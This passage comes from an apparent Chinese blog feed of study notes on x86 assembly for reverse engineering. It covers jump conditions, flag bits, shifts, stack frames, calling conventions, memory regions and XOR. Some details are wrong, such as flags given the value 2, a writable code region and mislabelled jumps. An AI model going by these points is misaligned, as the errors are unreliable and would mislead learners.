1</td></tr><tr><td>JNO</td><td>结果没有溢出则跳转</td><td>OF = 0</td></tr><tr><td>JB，JNAE</td><td>小于则跳转</td><td>CF = 1</td></tr><tr><td>JNB，JAE</td><td>大于等于则跳转（无符号数）</td><td>CF = 0</td></tr><tr><td>JBE，JNA</td><td>小于等于则跳转（无符号数）</td><td>CF=1 or ZF=1</td></tr><tr><td>JNBE，JA</td><td>大于则跳转（无符号数）</td><td>CF = 0 and ZF=0</td></tr><tr><td>JL，JNGE</td><td>小于则跳转（有符号数）</td><td>SF!=OF</td></tr><tr><td>JNL，JGE</td><td>大于则跳转（有符号数）</td><td>SF=OF</td></tr><tr><td>JLE，JNG</td><td>小于等于则跳转（有符号数）</td><td>ZF=1 or SF!=OF</td></tr><tr><td>JNLE，JG</td><td>大于则跳转（有符号数）</td><td>ZF=0 and SF=OF</td></tr></tbody></table><h2 id="标志位"><a href="#标志位" class="headerlink" title="标志位"></a>标志位</h2><p><strong>mov不改变标志位</strong></p><p><strong>是无符号运算还是有符号运算由我们说了算</strong></p><table><thead><tr><th></th><th></th><th></th></tr></thead><tbody><tr><td>0</td><td>CF</td><td>进位标志</td></tr><tr><td>2</td><td>PF</td><td>奇偶标志</td></tr><tr><td>4</td><td>AF</td><td>辅助进位标志</td></tr><tr><td>6</td><td>ZF</td><td>零标志</td></tr><tr><td>7</td><td>SF</td><td>符号标志</td></tr><tr><td>8</td><td>TF</td><td>单步标志</td></tr><tr><td>9</td><td>IF</td><td>中断使能标志</td></tr><tr><td>10</td><td>DF</td><td>方向标志</td></tr><tr><td>11</td><td>OF</td><td>溢出标志</td></tr></tbody></table><ol><li>进位标志CF（carry flag）：如果运算结果的最高位产生一个进位或错位，那么其值为1，否则值为0。（无符号数）</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">MOV AL,0xEF</span><br><span class="line">ADD AL,2</span><br><span class="line">//CF值为0</span><br><span class="line">MOV AL,0xFE</span><br><span class="line">ADD AL,2</span><br><span class="line">//CF值为1</span><br><span class="line">MOV AL,0xF0</span><br><span class="line">SUB AL,0xFF</span><br><span class="line">//CF值为1</span><br></pre></td></tr></table></figure><hr><ol start="2"><li>奇偶标志PF（Parity Flag）：奇偶标志PF用于反映运算结果中1的个数的奇偶性。如果1的个数为偶数，PF值为1，否则值为0。<strong>（最低有效字节，只看最后八位）</strong>不管32位16位还是8位的数，都只看最后八位有多少1。</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">MOV AL,3</span><br><span class="line">ADD AL,3</span><br><span class="line">//3+3=6,0110,PF值为2</span><br><span class="line">ADD AL,2</span><br><span class="line">//6+2=8,1000,PF值为1</span><br></pre></td></tr></table></figure><hr><ol start="3"><li>辅助进位标志AF（Auxiliary Carry Flag）：</li></ol><p>在发生下列情况时，辅助进位标志AF的值被置为1，否则其值为0。</p><ul><li>在字操作时，发生低字节向高字节进位或借位时</li><li>在字节操作时，发生低4位向高4位进位或借位时</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">MOV EAX, 0x55EEFFFF</span><br><span class="line">ADD EAX, 2</span><br><span class="line">//AF的值为2</span><br><span class="line">MOV AX, 5EFE</span><br><span class="line">ADD AX, 2</span><br><span class="line">//AF的值为2</span><br><span class="line">MOV AL, 4E</span><br><span class="line">ADD AL, 2</span><br><span class="line">//AF的值为2</span><br></pre></td></tr></table></figure><hr><ol start="4"><li>零标志ZF（Zero Flag），零标志ZF用来反映运算结果是否为0。如果运算结果为0，则其值为1，否则其值为0。</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">XOR EAX, EAX</span><br><span class="line">//EAX清0,ZF值为1</span><br><span class="line">MOV EAX, 2</span><br><span class="line">SUB EAX, 2</span><br><span class="line">//ZF值为1</span><br></pre></td></tr></table></figure><p><strong>如果使用<code>MOV EAX,0</code>是不改变寄存器的</strong></p><hr><ol start="5"><li>符号标志SF（Sign Flag）,符号标志SF用来反映运算结果的符号位，它与运算结果的最高位相同。</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">MOV AL,7F</span><br><span class="line">ADD AL,2</span><br><span class="line">//7F = 0111 1111</span><br><span class="line">//7f+2 = 81</span><br><span class="line">//81 = 1000 0001</span><br><span class="line">//SF的值为1</span><br></pre></td></tr></table></figure><hr><ol start="6"><li>溢出标志OF（Overflow Flag），溢出标志OF用于反映<strong>有符号数</strong>加减运算所得结果是否溢出。如果运算结果超过当前运算位数所能表达的范围，则称为溢出，OF值为1。否则OF的值为0。</li></ol><p>和CF类似，不过这个是有符号数，取决于最高位。最高位由1变成0或者由0变成1，都会改变OF的值。</p><p>正+正=正 如果等于负数，则溢出</p><p>负+负=负 如果等于正数，则溢出</p><p>负+正不会溢出</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mov al,80</span><br><span class="line">sub al,40</span><br><span class="line">//1000 0000</span><br><span class="line">//+1100 0000</span><br><span class="line">//___________________</span><br><span class="line">//0100 0000</span><br><span class="line">//OF值为1</span><br><span class="line">//减法其实也是加法，只不过加的是有符号数负数。</span><br></pre></td></tr></table></figure><h2 id="位运算"><a href="#位运算" class="headerlink" title="位运算"></a>位运算</h2><h3 id="算数移位（有符号）"><a href="#算数移位（有符号）" class="headerlink" title="算数移位（有符号）"></a>算数移位（有符号）</h3><p>SAL：算术左移</p><p>SAR：算数右移</p><p>格式：<code>SAL/SAR Reg/Mem, CL/Imm</code></p><p>会把移出的数据放到cf里</p><p>SAL左移的时候会补0，SAR右移补符号位。</p><h3 id="逻辑移位（无符号）"><a href="#逻辑移位（无符号）" class="headerlink" title="逻辑移位（无符号）"></a>逻辑移位（无符号）</h3><p>SHL左<strong>（有符号无符号的左移都用这个）</strong></p><p>SHR右</p><p>只补0，移出的位放到CF里</p><h3 id="循环移位"><a href="#循环移位" class="headerlink" title="循环移位"></a>循环移位</h3><p>ROL左</p><p>ROR右</p><p>把移出的位放到要补的地方，移出的位放到CF里</p><h3 id="带进位的循环移位"><a href="#带进位的循环移位" class="headerlink" title="带进位的循环移位"></a>带进位的循环移位</h3><p>RCL左</p><p>RCR右</p><p>把CF里放的值补上，移出的位放到CF里</p>]]></content>
      
      
      <categories>
          
          <category> 2020年9月 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>[视频笔记] 滴水逆向_基础</title>
      <link href="/2020/09/18/%E6%BB%B4%E6%B0%B4%E9%80%86%E5%90%91-c%E5%9F%BA%E7%A1%80/"/>
      <url>/2020/09/18/%E6%BB%B4%E6%B0%B4%E9%80%86%E5%90%91-c%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>本文环境为vc6.0和32位汇编</p><p>和8月份那篇有些重复，不过是当时写的笔记懒得修改了，能ctrl+f查就行</p><br><h1 id="0x01-堆栈图"><a href="#0x01-堆栈图" class="headerlink" title="0x01 堆栈图"></a>0x01 堆栈图</h1><p>汇编代码是这样的：</p><p>这个是没call之前的</p><p><img src="https://i.loli.net/2020/08/26/3r6tjz4sRHSq8BJ.png" alt="image-20200826224059606.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">参数：</span><br><span class="line">push 0x4</span><br><span class="line">push 0x3</span><br><span class="line">push 0x2</span><br></pre></td></tr></table></figure><p>此时的堆栈图：</p><p><img src="https://i.loli.net/2020/08/26/h52TUsRBZitWnHX.png"></p><p>call之后</p><p><img src="https://i.loli.net/2020/08/26/WFYwcnKgLUH7Abx.png" alt="image-20200826223507775.png"></p><p>进入jmp</p><p><img src="https://i.loli.net/2020/08/26/KFZLa3qTf569m7c.png" alt="image-20200826224302522.png"></p><p>此时的堆栈图：</p><p><img src="https://i.loli.net/2020/08/26/PxDNKlm18ABHiz4.png" alt="QQ截图20200826224552.png"></p><p>在把参数压入栈之后再把ebp栈底也也压入栈，之后把esp的值赋给ebp。</p><p>此时栈中情况是这样的（和图基本一样</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">ediesp</span><br><span class="line">esi</span><br><span class="line">ebx</span><br><span class="line">断点×16</span><br><span class="line">原ebp的值ebp</span><br><span class="line">返回地址</span><br><span class="line">参数</span><br><span class="line">参数</span><br><span class="line">参数</span><br><span class="line">之前程序用剩下的...</span><br><span class="line">原ebp</span><br></pre></td></tr></table></figure><p>题外话：要注意的是<strong>堆栈平衡</strong>（调用完一个函数前和调用完一个函数后，堆栈没有变化），所以这些值稍后都会返回。</p><p>接下来把esp减了0x40。之后会填充cccccccc的值，cc相当于<code>int3</code>的硬编码，也就是断点，是为了防止缓冲区溢出。程序没用到的内存，需要做特别处理，否则程序会运行，所以程序会把不用的地方全写成cc。</p><p><strong>如果函数什么也不做，那么vc6会生成0x40的缓冲区，每多一个局部变量，便会多减4。long long减8。会在函数生成之前分配完成。</strong></p><p>然后就是<strong>push ebx，push esi，push edi</strong>，把寄存器原先的值保存一下，因为接下来要用到。</p><p><strong>（这里将三个寄存器压栈的原因就是相关调用约定（具体来说是 x86 cdecl ）将这三个寄存器规定为非易失寄存器。）</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">lea edi, dword ptr ss:[ebp-0x40]</span><br><span class="line">mov ecx, 0x10</span><br><span class="line">mov eax, 0xcccccccc</span><br><span class="line">rep stos dword ptr ptr es:[edi]</span><br><span class="line"></span><br><span class="line">mov eax, dword ptr ss:[ebp+0x8]</span><br><span class="line">add eax, dword ptr ss:[ebp+0xc]</span><br><span class="line">sub eax, dword ptr ss:[ebp+0x10]</span><br></pre></td></tr></table></figure><p>前四行都是在填充cc的值，没啥好说的，看看我上面写的和图就差不多能懂。lea取地址（0019FE90），然后就是ecx和rep的重复。</p><p>下面三行就是这个函数的作用，很简单，2+3-4，大概是下面这样的代码。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">huibian</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b, <span class="keyword">int</span> c)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> a+b-c;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">huibian</span>(<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后函数就结束了，堆栈平衡，把之间压入的寄存器ebx，esi，edi弹回去。</p><p>此时堆栈图：</p><p><img src="https://i.loli.net/2020/08/26/rEbKNUmzF3su6YI.png" alt="QQ截图20200826231723.png"></p><p>然后把ebp的值传到esp里去</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">断点×16</span><br><span class="line">原ebp的值ebp,esp</span><br><span class="line">返回地址</span><br><span class="line">参数</span><br><span class="line">参数</span><br><span class="line">参数</span><br><span class="line">之前程序用剩下的...</span><br><span class="line">原ebp</span><br></pre></td></tr></table></figure><p>然后再把ebp弹出</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">返回地址esp</span><br><span class="line">参数</span><br><span class="line">参数</span><br><span class="line">参数</span><br><span class="line">之前程序用剩下的...</span><br><span class="line">原ebpebp</span><br></pre></td></tr></table></figure><p>retn就返回回去了（retn = pop eip）</p><p><img src="https://i.loli.net/2020/08/26/AfowlCZb8mB49h2.png" alt="QQ截图20200826232044.png"></p><p>因为要堆栈平衡，所以就<code>add esp, 0xc(12)</code>把参数的栈清掉。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>一个函数的运行过程</p><ol><li>（把参数压入栈，参数是倒着压入的，先压入后面的参数）call跳转运行；</li><li>把栈底地址压入栈，同时让栈底变成push ebp的那个地址（方便存取参数），提升栈底；</li><li>留下缓存空间；</li><li>把寄存器的值压入栈（保存现场）；</li><li>程序把不用的地方（缓存空间）填入cc，否则垃圾数据会影响程序运行；</li><li>函数运行；</li><li>函数结束，各种清栈。</li></ol><h2 id="调用约定"><a href="#调用约定" class="headerlink" title="调用约定"></a>调用约定</h2><p>上面提到的调用约定</p><table><thead><tr><th>调用约定</th><th>参数压栈顺序</th><th>平衡堆栈</th></tr></thead><tbody><tr><td>__cdecl</td><td>从右至左入栈（从后往前）</td><td>函数外部清理堆栈</td></tr><tr><td>__stdcall</td><td>从右至左入栈</td><td>函数内部清理堆栈</td></tr><tr><td>__fastcall</td><td>ECX/EDX传送前两个，剩下：从右至左入栈</td><td>只有两个不需要清理堆栈，多的在函数内部清理。</td></tr></tbody></table><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//使用方法</span></span><br><span class="line"></span><br><span class="line">返回类型 调用约定 函数名(参数)&#123;&#125;</span><br></pre></td></tr></table></figure><p>这个也是c和c++默认的调用约定</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">fun</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a+b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">push <span class="number">2</span></span><br><span class="line">push <span class="number">1</span></span><br><span class="line">call @ILT+<span class="number">15</span>(fun) (<span class="number">00401014</span>)</span><br><span class="line">add esp,<span class="number">8</span></span><br></pre></td></tr></table></figure><p>WindowsAPI的调用方式</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __stdcall <span class="title">fun</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a+b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">push <span class="number">2</span></span><br><span class="line">push <span class="number">1</span></span><br><span class="line">call @ILT+<span class="number">10</span>(fun) (<span class="number">0040100f</span>)</span><br><span class="line">函数内部:</span><br><span class="line">ret <span class="number">8</span></span><br><span class="line"><span class="comment">//ret的意思是先ret再esp+8</span></span><br></pre></td></tr></table></figure><p>别的都是用堆栈（内存）传递数据，fastcall用寄存器edx，ecx传递数据。如果经常使用这个函数，应该用这种方式写函数。只有两个函数不需要清理堆栈。用这个约定最好只写两个参数，否则和别的区别不大。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">fun</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a+b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mov edx,<span class="number">2</span></span><br><span class="line">mov ecx,<span class="number">1</span></span><br><span class="line">call @ILT+<span class="number">0</span>(fun) (<span class="number">00401005</span>)</span><br><span class="line">函数内部:</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><p>函数之前提前push的值不一定是当前函数的参数，因为经过优化之后，可能根本没用到当前参数，而是后面函数的参数。</p><p><strong>不要思维定势，认为参数只能压入栈。也可以放到寄存器等等，只要能让函数用到就行。</strong></p><br><h1 id="0x02-内存"><a href="#0x02-内存" class="headerlink" title="0x02 内存"></a>0x02 内存</h1><p>一个程序在内存中执行的时候，会把程序分成几个区域。</p><h2 id="代码区"><a href="#代码区" class="headerlink" title="代码区"></a>代码区</h2><p>可读可写，用来存放代码。</p><h2 id="堆栈"><a href="#堆栈" class="headerlink" title="堆栈"></a>堆栈</h2><p>函数不调用时不分配堆栈。堆栈用来存放参数，局部变量，临时数据。</p><p><strong>局部变量的特点：</strong></p><ol><li>局部变量在程序编译完成后并没有分配固定的地址</li><li>在所属的函数没有被调用时，局部变量并不会分配内存地址，只有当所属的程序被调用了，才会在堆栈中分配内存。</li><li>当局部变量所属的函数执行完毕后，局部变量所占用的内存将变成垃圾数据，局部变量消失。</li><li>局部变量只能在函数内部使用，函数A无法使用函数B的局部变量</li><li><strong>局部变量的反汇编识别：[ebp-4]， [ebp-8]，[ebp-0xc]。</strong>不同的编译器有可能会是[esp+]，通过栈顶找值。</li></ol><h2 id="堆"><a href="#堆" class="headerlink" title="堆"></a>堆</h2><p>动态申请的，大小是可变的。</p><p>可读可写。</p><h2 id="全局变量区"><a href="#全局变量区" class="headerlink" title="全局变量区"></a>全局变量区</h2><p>可读可写，存储全局变量。</p><p><strong>全局变量的特点：</strong></p><ol><li><p>全局变量在程序编译完成后地址就已经确定下来了，只要程序启动，全局变量就会存在。启动后里面是否有值取决于声明是否给定了初始值，如果没有，默认为0。</p></li><li><p>全局变量的值可以被所有函数所修改，里面存储的是最后一次修改的值。</p></li><li><p>全局变量直到程序结束才会被释放</p></li><li><p>全局变量就是所谓的<strong>基址</strong></p></li><li><p><strong>全局变量的反汇编识别：如果看到一个直接的地址，那它就是全局变量。因为它早确定了不会改了。</strong></p></li></ol><h2 id="常量区"><a href="#常量区" class="headerlink" title="常量区"></a>常量区</h2><p>只读，存储常量。</p><p>例子（字符常量）：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span>* a = <span class="string">&quot;china&quot;</span>;</span><br><span class="line"><span class="keyword">char</span> b[] = <span class="string">&quot;china&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>:    <span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="number">00401010</span>   push        ebp</span><br><span class="line"><span class="number">00401011</span>   mov         ebp,esp</span><br><span class="line"><span class="number">00401013</span>   sub         esp,<span class="number">4</span>Ch</span><br><span class="line"><span class="number">00401016</span>   push        ebx</span><br><span class="line"><span class="number">00401017</span>   push        esi</span><br><span class="line"><span class="number">00401018</span>   push        edi</span><br><span class="line"><span class="number">00401019</span>   lea         edi,[ebp<span class="number">-4</span>Ch]</span><br><span class="line"><span class="number">0040101</span>C   mov         ecx,<span class="number">13</span>h</span><br><span class="line"><span class="number">00401021</span>   mov         eax,<span class="number">0</span>CCCCCCCCh</span><br><span class="line"><span class="number">00401026</span>   rep stos    dword ptr [edi]</span><br><span class="line"><span class="number">2</span>:        <span class="keyword">char</span>* a = <span class="string">&quot;china&quot;</span>;</span><br><span class="line"><span class="number">00401028</span>   mov         dword ptr [ebp<span class="number">-4</span>],offset string <span class="string">&quot;china&quot;</span> (<span class="number">0042201</span>c)</span><br><span class="line"><span class="number">3</span>:       <span class="keyword">char</span> b[] = <span class="string">&quot;china&quot;</span>;</span><br><span class="line"><span class="number">0040102F</span>   mov         eax,[string <span class="string">&quot;china&quot;</span> (<span class="number">0042201</span>c)]</span><br><span class="line"><span class="number">00401034</span>   mov         dword ptr [ebp<span class="number">-0</span>Ch],eax</span><br><span class="line"><span class="number">00401037</span>   mov         cx,word ptr [string <span class="string">&quot;Hello World!\n&quot;</span>+<span class="number">4</span> (<span class="number">00422020</span>)]</span><br><span class="line"><span class="number">0040103</span>E   mov         word ptr [ebp<span class="number">-8</span>],cx</span><br><span class="line"><span class="number">4</span>:   &#125;</span><br></pre></td></tr></table></figure><p>修改</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span>* a = <span class="string">&quot;china&quot;</span>;</span><br><span class="line"><span class="keyword">char</span> b[] = <span class="string">&quot;china&quot;</span>;</span><br><span class="line">a = <span class="string">&quot;A&quot;</span>;</span><br><span class="line">*a = <span class="string">&#x27;B&#x27;</span>;</span><br><span class="line">b[<span class="number">0</span>] = <span class="string">&#x27;A&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1:       a = &quot;A&quot;;//a不是常量，而是char*所以可以修改</span><br><span class="line">00401042   mov         dword ptr [ebp-4],offset string &quot;A&quot; (0042201c)</span><br><span class="line">2:       *a = &#x27;B&#x27;;//出错，因为不能修改字符常量</span><br><span class="line">00401049   mov         edx,dword ptr [ebp-4]</span><br><span class="line">0040104C   mov         byte ptr [edx],42h</span><br><span class="line">3:       b[0] = &#x27;A&#x27;;//这种写法会把字符常量复制到堆栈，改的地方也是堆栈</span><br><span class="line">0040104F   mov         byte ptr [ebp-0Ch],41h</span><br></pre></td></tr></table></figure><br><h1 id="0x03-对于杂项基础的一些补充"><a href="#0x03-对于杂项基础的一些补充" class="headerlink" title="0x03 对于杂项基础的一些补充"></a>0x03 对于杂项基础的一些补充</h1><h2 id="进制"><a href="#进制" class="headerlink" title="进制"></a>进制</h2><p>十进制的定义是由10个符号组成，逢十进一。</p><p>n进制的定义是由n个符号组成，逢n进一，如果自己定义符号，而不是简单的12345等等，将给解密者带来很大麻烦。</p><p><strong>进制的运算不应该是靠转换，而是查表。</strong></p><p><img src="https://i.loli.net/2020/08/24/oGWm9J4TOxaAhP1.png"></p><p><strong>80-FF是负数，0到7F是正数</strong></p><h2 id="逻辑运算（与或非-异或-加密解密）-宽度"><a href="#逻辑运算（与或非-异或-加密解密）-宽度" class="headerlink" title="逻辑运算（与或非 异或 加密解密）(宽度)"></a>逻辑运算（与或非 异或 加密解密）(宽度)</h2><p>受硬件影响，数据有长度限制，超过宽度的数据会被丢掉。</p><p>我们学的是32位寄存器，最多能存储<code>32/4=8</code>个数字。所以如果<code>mov eax,123456789</code>，eax只会存储<code>23456789</code>。</p><p>或</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1011000101</span><br><span class="line">or1001100110</span><br><span class="line">_________________________</span><br><span class="line">1011100111</span><br></pre></td></tr></table></figure><p>与</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1011000101</span><br><span class="line">and1001100110</span><br><span class="line">_________________________</span><br><span class="line">1001000100</span><br></pre></td></tr></table></figure><p>异或</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1011000101</span><br><span class="line">xor1001100110</span><br><span class="line">_________________________</span><br><span class="line">0010100011</span><br></pre></td></tr></table></figure><p>非</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">not1001100110</span><br><span class="line">__________________________</span><br><span class="line">0110011001</span><br></pre></td></tr></table></figure><p>大部分加密解密都是用了异或的概念</p><p>例如加密2014，设置一个密钥5</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">2014转化为二进制就是 0010 0000 0001 0100</span><br><span class="line">密钥为 0101</span><br><span class="line">加密:</span><br><span class="line">0010 0000 0001 0100</span><br><span class="line">xor0101 0101 0101 0101</span><br><span class="line">_________________________</span><br><span class="line">0111 0101 0100 0001</span><br><span class="line">加密结果为7541</span><br><span class="line">解密:</span><br><span class="line">0111 0101 0100 0001</span><br><span class="line">xor0101 0101 0101 0101</span><br><span class="line">_________________________</span><br><span class="line">0010 0000 0001 0100</span><br></pre></td></tr></table></figure><br><h1 id="0x04-异常"><a href="#0x04-异常" class="headerlink" title="0x04 异常"></a>0x04 异常</h1><p>0xC0000005访问错误</p><br><h1 id="0x05-一些别的写法"><a href="#0x05-一些别的写法" class="headerlink" title="0x05 一些别的写法"></a>0x05 一些别的写法</h1><h2 id="裸函数"><a href="#裸函数" class="headerlink" title="裸函数"></a>裸函数</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">返回类型 __declspec(naked) 函数名(形参)&#123;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译器不会管裸函数，我们可以在裸函数里面直接写汇编</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __declspec(naked) <span class="built_in">fun</span>()&#123;</span><br><span class="line">    __asm</span><br><span class="line">    &#123;</span><br><span class="line">        ret</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>不写ret的话里面一行汇编都没有，会导致函数call完无法返回，所以我们加ret让这个函数正确执行。</p><h2 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h2><p>数据类型的三个要素：</p><ol><li><p>存储数据的宽度</p></li><li><p>存储数据的格式</p></li><li><p>作用域</p></li></ol><h3 id="整数类型"><a href="#整数类型" class="headerlink" 